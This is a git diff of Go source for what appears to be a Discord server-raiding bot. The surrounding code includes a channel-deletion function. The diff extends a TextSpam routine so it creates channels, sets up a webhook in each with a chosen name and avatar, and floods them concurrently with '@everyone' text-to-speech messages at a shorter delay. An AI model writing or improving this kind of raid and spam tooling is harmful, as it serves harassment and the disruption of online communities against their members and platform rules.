@@ -28,7 +28,7 @@ func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel) {
 	}
 }
 
-func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
+func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup, username string, avatarurl string) {
 	godotenv.Load()
 
 	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
@@ -56,6 +56,15 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 	dataMsg := discordgo.MessageSend{
 		Content: "@everyone",
 		Embeds:  []*discordgo.MessageEmbed{&embed},
+		TTS:     true,
+	}
+
+	dataHookMsg := discordgo.WebhookParams{
+		Username:  username,
+		AvatarURL: avatarurl,
+		Content:   "@everyone",
+		Embeds:    []*discordgo.MessageEmbed{&embed},
+		TTS:       true,
 	}
 
 	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
@@ -63,7 +72,7 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 
 	data := requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/channels", "POST", jsonData)
 
-	time.Sleep(2 * time.Second)
+	time.Sleep(time.Second)
 
 	type ResponseData struct {
 		ID string `json:"id"`
@@ -75,13 +84,35 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 		fmt.Println("There's an error while decoding JSON:", err)
 		return
 	}
+	dataHook := map[string]any{
+		"name": "hook",
+	}
+
+	hookData, _ := json.Marshal(dataHook)
+	createdHook := requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/webhooks", "POST", hookData)
+
+	type ResponseDataHook struct {
+		URL string `json:"url"`
+	}
+
+	var responseDataHook ResponseDataHook
+
+	err2 := json.Unmarshal([]byte(createdHook), &responseDataHook)
+	if err2 != nil {
+		fmt.Println("There's an error while decoding JSON:", err2)
+		return
+	}
 
 	jsonData, _ = json.Marshal(dataMsg)
+	hookData, _ = json.Marshal(dataHookMsg)
 
-	for i := 0; i < 14; i++ {
-		wg.Add(1)
+	for i := 0; i < 7; i++ {
+		//wg.Add(1)
 		go func() {
-			defer wg.Done()
+			//defer wg.Done()
+			requests.Sendhttp(responseDataHook.URL, "POST", hookData)
+			requests.Sendhttp(responseDataHook.URL, "POST", hookData)
+
 			requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
 		}()
 		time.Sleep(time.Second)
